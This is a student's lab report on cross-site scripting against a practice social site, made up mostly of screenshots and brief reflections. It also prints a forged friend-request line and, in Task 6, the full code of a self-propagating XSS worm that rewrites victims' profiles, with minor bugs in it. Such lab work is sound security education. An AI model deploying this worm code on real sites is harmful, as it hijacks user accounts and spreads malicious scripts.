
<div align="center">Lab 02 | CSCI 476
  
Zoe Norden | s68k193() 
</div>


## Task 1

![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task1.1.png)

![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task1.png)

I wasn't sure if I need tod o the more advanced thing with the separate file or anything. Given that it didn't say so in the instructions, I will assume I did not need to do so. So far this seems very similar to the SQL injection thing that we did on the last lab.

Is it possible to do a more advanced version of this using the larger script file thing and then insert a video or something? I wouldn't be able to get it to work with the existing field because I'd run into a character limit on my space, but I should be able to run something if I tossed it into a file to run. I am curious if I could get the actual video to pop up or if it'd just be the link to the video, which wouldn't be as funny. 

## Task 2

![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task2.png)
![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task2.1.png)

I still don't quite understand the dangers behind cookies. 

## Task 3

![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task3.png)
![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task3.1.png)

I can kind of see why knowing this info would be dangerous though. 


## Task 4

### Task 4.1

Our first image is pre-friend Boby and the second image is after we've added Boby as a friend. 
![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task4.1.png)
![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task4.1.2.png)

Now here's a code block of the code that I inserted. There is also a screenshot of the full code snippet below that textblock of code. From what I understand, this code looks at the url and then goes to add friend withthe id number of 57. 

`var sendurl="http://www.xsslabelgg.com/action/friends/add" + "?friend=57" + token + ts;`

![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task4.1.1.png)


### Task 4.2

For task 4.2 I was unable to successfully re-add Boby as a friend. To try and accomplish this, I removed the code from the "edit HTML" section and just directly pasted it in Samy's bio. I also removed Boby as a friend before I used this attack to verify things. I was unable to readd Boby as a friend if I just pasted it in the normal About me field. As you can see from the screenshots, I am still friendless. 

![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task4.2.png)
![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task4.2.1.png)

## Task 5


### Task 5.1

Once again, we will be targetting poor Boby. As you can see from the screenshot below, Boby has a very poor MySpace-esque profile page. Let's see if we can't spice things up. You know, once he visits Samy's profile.

![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task5.1.png)
![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task5.1.1.png)

Okay, so I had to create the variable desc which is our description variable. This is because I honestly couldn't tell if the `var name, guid, ts, token` was actually doing anything so I created the `var desc` which would directly edit the profile of poor Boby. Full code snippet is below. 

![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task5.1.2.png)


### Task 5.2

You need this line of code because if you didn't have it, you would attack yourself. So this is basically saying that if the user id is not Samy's, then we continue with the attack, but if it is, we do not do anything. This was probably the hardest part for me to figure out for some reason because I couldn't figure out what Samy's GUID was for the life of me. 

## Task 6

```js

<script type="text/javascript" id="worm">
window.onload = function(){

var headerTag = "<script id=\ "worm\" type=\"text/javascript\">";
var jsCode = document.getElementById("worm").innerHTML;
var tailTag="</" + "script>";
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

var userName=elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;

var accesslevel="&accesslevel[description]=2";
var description="&description="+wormCode;
var briefdescription="&briefdescription=Zoe was here again";

var content=token +ts +userName + description + briefdescription+accesslevel+guid;
var sendurl="http://www.xsslabelgg.com/action/profile/edit";
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type",
	"application/x-www-form-urlencoded");
Ajax.send(content);

var Ajax2=null;
var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=59"+ts+token;
Ajax=new XMLHttpRequest();
Ajax2.open("GET",sendurl,true);
Ajax2.setRequestHeader("Host","www.xsslabelgg.com");
Ajax2.setRequestHeader("Content-Type",
	"application/x-www-form-urlencoded");
Ajax2.send();
}
</script>

```
